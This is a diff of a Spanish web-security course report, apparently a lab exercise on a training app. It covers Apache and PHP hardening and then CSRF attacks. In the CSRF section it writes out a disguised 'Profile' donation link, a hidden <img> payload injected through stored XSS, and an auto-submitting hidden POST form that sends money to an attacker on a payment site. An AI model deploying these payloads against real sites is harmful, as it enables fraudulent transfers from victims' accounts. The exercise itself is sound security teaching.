-3. Cookies blindadas: Configurar la cookie de sesión para que tenga HttpOnly (así JavaScript no puede leerla y nos protegemos un poco de XSS) y Secure (para que solo viaje por HTTPS).
-
-*`// Configuración segura de cookies de sesión`*
-
-`session_set_cookie_params([`
-
-    `'lifetime' => 1800, // 30 minutos`
-
-    `'path' => '/',`
-
-    `'domain' => 'localhost',`
-
-    `'secure' => true, // Solo HTTPS`
-
-    `'httponly' => true, // No accesible por JS`
-
-    `'samesite' => 'Strict'`
-
-`]);`
-
-`session_start();`
-
-Parte 4 \- Servidores web
-
-La seguridad no es solo código PHP; el servidor donde corre todo (Apache) también tiene que estar bien configurado. He revisado cómo está montado Talent ScoutTech y propongo estos cambios para endurecerlo (hardening).
-
-a) No dar pistas (Security by Obscurity)
-
-Por defecto, Apache es muy "bocazas" y le cuenta a todo el mundo su versión y el sistema operativo en las cabeceras o cuando da un error. Esa info le viene genial a un atacante para buscar fallos específicos de esa versión.
-
-Hay que tocar el archivo de configuración de Apache y poner:
-
-* ServerTokens Prod: Para que solo diga "Apache" y se calle la versión.  
-* ServerSignature Off: Para que no firme los errores 404 con todos sus datos.
-
-b) Que no se vean los archivos (Directory Listing)
-
-Si entras a una carpeta sin index.php (como css/ o img/), Apache te lista todos los archivos. Eso queda feo y además da información de la estructura.
-
-Se arregla fácil quitando el listado con Options \-Indexes en la configuración global o en el .htaccess.
-
-`<Directory /var/www/html>`
-
-    `Options -Indexes`
-
-`</Directory>`
-
-c) Cabeceras que protegen
-
-Podemos decirle al navegador que se proteja solo enviando unas cabeceras extra:
-
-* X-Frame-Options: SAMEORIGIN: Para que nadie pueda meter nuestra web en un \<iframe\> y hacernos clickjacking.  
-* X-Content-Type-Options: nosniff: Para que el navegador no intente adivinar qué tipo de archivo es. Esto evita que alguien suba un .txt con código malicioso y el navegador lo ejecute como si fuera un script.  
-* HSTS: Si usamos HTTPS (que deberíamos), esto obliga a que la conexión sea siempre segura.
-
-d) Ajustando PHP (php.ini)
-
-PHP también viene un poco "suelto" de fábrica. Hay que atarlo en corto en el php.ini:
-
-* expose\_php \= Off: Para no ir gritando "¡Uso PHP versión X\!".  
-* display\_errors \= Off: En producción, los errores se guardan en un log, nunca se muestran en pantalla. Ya vimos antes que los errores de SQL nos daban muchas pistas.  
-* disable\_functions: Desactivar funciones peligrosas como exec o system si no las usamos, para que si alguien entra no lo tenga tan fácil para ejecutar comandos del sistema.
-
-e) Ojo con los backups
-
-Como vimos antes, dejarse archivos .php\~ o .bak es un peligro.  
-Podemos decirle a Apache que bloquee directamente el acceso a cualquier archivo que termine en estas extensiones, por si a algún desarrollador se le olvida borrarlo.
-
-`<FilesMatch "(\.(bak|config|sql|ini|log|sh|inc|swp)|~)$">`
-
-    `Order allow,deny`
-
-    `Deny from all`
-
-    `Satisfy All`
-
-`</FilesMatch>`
+Esto asegura que aunque un desarrollador olvide un archivo sensible en el servidor, nadie pueda descargarlo desde el navegador.
 
 | Versión de Apache | ServerTokens Prod / ServerSignature Off | Oculta versiones vulnerables a atacantes. |
 | :---- | :---- | :---- |
@@ -417,71 +358,66 @@ Podemos decirle a Apache que bloquee directamente el acceso a cualquier archivo 
 | Configuración PHP | expose\_php \= Off, display\_errors \= Off | Reduce la fuga de información técnica y errores. |
 | Archivos Ocultos | Bloqueo por extensión (.bak, \~) | Previene la descarga de código fuente y backups. |
 
-Parte 5 \- Cross-Site Request Forgery (CSRF)
+# **Parte 5 \- Cross-Site Request Forgery (CSRF)**
 
-a) La trampa del botón "Profile"
+1) ##  **Creación del botón "Profile" en el listado de jugadores**
 
-Para ver si podía engañar a un usuario para que donara dinero sin querer, modifiqué list\_players.php. Añadí un botón que parece inofensivo ("Profile") pero que en realidad lanza la petición de donación.
+Para facilitar que las víctimas ejecuten la donación fraudulenta sin darse cuenta, hemos modificado el código de la página list\_players.php. El objetivo es añadir un botón visualmente legítimo, etiquetado como "Profile", que en realidad desencadena la petición GET maliciosa hacia la plataforma de pagos. Añdimos este código a list\_platers.php
 
-*`<!-- Botón malicioso disfrazado -->`*
+\<a href="http://web.pagos/donate.php?amount=100\&receiver=me" class="button"\>  
+    Perfil  
+\</a\>
 
-`<a href="http://web.pagos/donate.php?amount=100&receiver=attacker" class="button">`
+Al insertar este enlace en el bucle que muestra los jugadores, aparecerá un botón "Profile" debajo de cada jugador. Cuando un usuario legítimo haga clic pensando que va a ver el perfil del jugador, su navegador enviará automáticamente la petición de donación a web.pagos. Si el usuario tiene una sesión activa en esa plataforma, la transferencia de 100€ se hace sola. Es un muy grave problema de seguridad, una vez más.
 
-    `Profile`
+2) ##  **Ataque invisible mediante comentario (XSS \+ CSRF)**
 
-`</a>`
+Aunque el botón es efectivo, requiere interacción del usuario (un clic). Para aumentar la eficacia del ataque, podemos automatizarlo utilizando la vulnerabilidad XSS que ya descubrimos en los comentarios (show\_comments.php).
 
-Ahora, debajo de cada jugador sale ese botón. Si un usuario pica pensando que va a ver el perfil, su navegador manda la petición al servidor de pagos. Y si tiene la sesión abierta allí... ¡adiós a 100€\!
+Podemos inyectar una etiqueta HTML que obligue al navegador a realizar la petición en segundo plano tan pronto como se cargue la página de comentarios, sin que el usuario tenga que hacer clic en nada. Esta es la payload:
 
-b) El ataque fantasma (XSS \+ CSRF)
+¡Gran jugador\!  
+\<img src="http://web.pagos/donate.php?amount=100\&receiver=attacker"   
+     width="0" height="0" style="display:none;" /\>
 
-El botón funciona, pero requiere que la víctima haga clic. Para hacerlo más letal, lo combiné con el XSS que encontré en los comentarios.  
-La idea es que la petición se haga sola nada más cargar la página, sin tocar nada.
+Al insertar este comentario, la etiqueta \<img\> intentará cargar una imagen desde la URL especificada en el atributo src.  
+El navegador interpretará esto como una petición legítima para obtener una imagen y realizará una petición GET a donate.php.  
+Como la petición incluye automáticamente las cookies del usuario para el dominio web.pagos (si existen), la plataforma procesará la donación.  
+Hemos añadido width="0" height="0" y display:none para que la imagen rota no sea visible, haciendo el ataque totalmente invisible para la víctima.
 
-Puse este comentario:
+3) ##  **Condiciones necesarias para el éxito del ataque**
 
-`¡Gran jugador!`
+Para que este ataque CSRF tenga éxito y el dinero se transfiera realmente a nuestra cuenta, se deben cumplir simultáneamente las siguientes condiciones:
 
-`<img src="http://web.pagos/donate.php?amount=100&receiver=attacker"`
+1. Sesión Activa: La víctima debe haber iniciado sesión previamente en web.pagos y su sesión (cookies) debe seguir siendo válida en el momento en que visualiza el comentario o hace clic en el botón.  
+2. Falta de Validación Anti-CSRF: La plataforma web.pagos no debe implementar mecanismos de protección como tokens Anti-CSRF (csrf\_token) o validación de cabeceras Referer/Origin. Si la web confía únicamente en las cookies de sesión para autorizar la transacción, es vulnerable.  
+3. Misma Navegación: El ataque debe ejecutarse en el mismo navegador donde la víctima tiene la sesión abierta, ya que las cookies se almacenan por navegador.  
+   
 
-     `width="0" height="0" style="display:none;" />`
+## **d) Ataque CSRF con POST y formulario oculto**
 
-¿El truco? La etiqueta \<img\> intenta cargar una imagen desde esa URL. Al navegador le da igual que sea una imagen o no, él hace la petición GET. Como le puse tamaño cero y oculto, la víctima no ve nada raro, pero la donación se ejecuta por detrás usando sus cookies.
+Si web.pagos cambiara su código para aceptar solo peticiones POST, el ataque anterior mediante la etiqueta \<img\> o un simple enlace \<a\> dejaría de funcionar, ya que estos elementos siempre generan peticiones GET.
 
-c) ¿Cuándo funciona esto?
+¿Quedaría blindada la aplicación?  
+No, no quedaría blindada. Cambiar de GET a POST no nos va a proteger contra CSRF, simplemente obliga al atacante a cambiar su método.
 
-Para que este ataque triunfe se tienen que alinear los astros (pero pasa más de lo que creemos):
+Ataque equivalente usando POST:  
+Para realizar la misma donación fraudulenta mediante POST sin interacción del usuario, necesitamos inyectar un formulario HTML y usar JavaScript para enviarlo automáticamente. El form puede ser así:
 
-1. Sesión abierta: La víctima tiene que estar logueada en la web de pagos en ese momento.  
-2. Sin protección: La web de pagos no comprueba de dónde viene la petición (no usa tokens Anti-CSRF ni mira el Referer). Se fía solo de que la cookie sea válida.  
-3. Mismo navegador: Obviamente, tiene que abrir mi comentario malicioso en el mismo navegador donde tiene la sesión del banco.
+\<form id="csrf\_form" action="http://web.pagos/donate.php" method="POST"\>  
+    \<input type="hidden" name="amount" value=”un\_monton\_un\_monton”t\>  
+    \<input type="hidden" name="receiver" value="hello\_my\_fellow\_non\_hacker"\>  
+\</form\>  
+\<script\>  
+    document.getElementById('csrf\_form').submit();  
+\</script\>
 
-d) ¿Y si cambian a POST?
+Este código crea un formulario invisible con los datos necesarios. El script de JavaScript se ejecuta inmediatamente después de renderizar el formulario, invocando el método .submit(). Esto genera una petición POST desde el navegador de la víctima hacia  web.pagos,  consiguiendo lo mismo que en el GET.
 
-Si la web de pagos se pone estricta y solo acepta peticiones POST, mi truco de la etiqueta \<img\> deja de funcionar, porque eso siempre es GET.  
-¿Están a salvo? Pues no. Solo me obligan a cambiar de táctica.
+[image1]: <data:image/png;base64,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